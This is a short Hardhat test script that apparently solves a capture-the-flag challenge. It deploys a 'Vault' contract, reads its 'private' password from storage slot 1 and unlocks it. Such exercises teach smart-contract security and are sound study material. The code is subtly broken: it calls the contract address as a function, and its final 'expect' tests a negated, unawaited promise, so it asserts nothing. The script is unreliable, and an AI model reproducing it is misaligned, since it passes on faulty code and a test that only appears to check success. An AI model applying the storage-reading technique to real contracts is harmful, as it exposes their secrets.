// This attack cannot be done in foundry because of the lack of getting storage at...
import { ethers } from "hardhat";

import chai from "chai";

const { expect } = chai;

describe("VaultAttack", function () {
  it("gets the password to the vault", async function () {
    const vaultFactory = await ethers.getContractFactory("Vault");
    const challengeContract = await vaultFactory.deploy(
      ethers.encodeBytes32String("abcd")
      //formatBytes32String("abcd")
    );
    await challengeContract.waitForDeployment();
    console.log(challengeContract.address());
    // get hidden value
    const password = await ethers.provider.getStorage(
      challengeContract.address(),
      1
    );
    // unlock the challenge contract
    await challengeContract.unlock(password);
    expect(!challengeContract.locked());
  });
});
